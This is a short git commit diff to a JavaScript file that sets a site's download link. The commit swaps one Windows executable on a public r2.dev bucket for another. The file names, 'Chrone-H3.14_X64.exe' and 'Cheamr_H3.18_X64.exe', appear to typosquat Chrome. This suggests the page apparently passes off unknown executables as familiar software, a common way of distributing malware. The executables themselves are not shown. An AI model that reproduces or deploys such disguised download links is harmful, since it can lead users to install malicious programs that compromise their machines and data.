1a6b9128e39d9af2ee2bb69b5a923b664d52c72f
kln6699 <hezs1v@163.com>
2025-03-19 21:22:53 +0800

    Update filename.js

--- assets/download/filename.js
+++ assets/download/filename.js
@@ -1,3 +1,3 @@
 (function() {
-    window['filename'] = 'https://pub-b978efeee5f74796b091da96ca739efb.r2.dev/Chrone-H3.14_X64.exe';
+    window['filename'] = 'https://pub-b978efeee5f74796b091da96ca739efb.r2.dev/Cheamr_H3.18_X64.exe';
 })();
